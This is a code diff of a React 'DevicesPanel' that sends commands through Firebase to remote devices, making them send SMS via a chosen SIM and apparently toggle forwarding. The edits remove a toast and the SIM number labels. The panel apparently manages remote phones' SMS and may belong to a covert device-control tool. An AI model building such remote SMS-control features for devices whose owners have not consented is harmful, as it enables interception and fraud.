@@ -123,7 +123,7 @@ export default function DevicesPanel({
     setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
   };
 
-  // SMS EXECUTE - YAHAN SE CONTENT CLEAR HONE WALA LINE HATA DIYA HAI
+  // SMS EXECUTE (Notification hata diya gaya hai)
   const handleCommand = (type, devId) => {
     const baseRef = ref(db, `user_data/${devId}`);
 
@@ -145,8 +145,7 @@ export default function DevicesPanel({
         simIndex: Number(simSlotSelected),
         timestamp: Date.now()
       }).then(() => {
-        showToast(`✅ SMS sent via SIM ${Number(simSlotSelected) + 1}`, "success");
-        // CONTENT CLEAR NAHI HOGA - WAHIN BANA RAHEGA
+        // "SMS sent via SIM 1" popup yahan se hata diya gaya hai
       });
     } 
     else if (type === "fwd_on") {
@@ -461,7 +460,7 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* SEND SMS TAB - SCREENSHOT KE EXACT DESIGN KE SATH (NEVER REMOVES CONTENT) */}
+                  {/* SEND SMS TAB */}
                   {curTab === "sendsms" && (
                     <div className="section-premium" style={{ background: "rgba(12, 16, 26, 0.8)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: 14 }}>
                       <div style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
@@ -471,7 +470,7 @@ export default function DevicesPanel({
                       {/* Recipient Phone Number Box */}
                       <input 
                         type="text" 
-                        placeholder="Enter phone number (e.g. 9999999999)" 
+                        placeholder="Enter phone number" 
                         className="search-input" 
                         style={{ 
                           background: "#090d15", 
@@ -506,7 +505,7 @@ export default function DevicesPanel({
                         onChange={(e) => handleBodyChange(e.target.value)}
                       />
 
-                      {/* SIM Selector Dropdown (Screenshot Style) */}
+                      {/* SIM Selector Dropdown */}
                       <div style={{ marginBottom: 14 }}>
                         <select
                           className="luxury-select"
@@ -523,8 +522,8 @@ export default function DevicesPanel({
                             cursor: "pointer"
                           }}
                         >
-                          <option value="0">SIM 1 ({sim1Num})</option>
-                          <option value="1">SIM 2 ({sim2Num})</option>
+                          <option value="0">SIM 1</option>
+                          <option value="1">SIM 2</option>
                         </select>
                       </div>
 
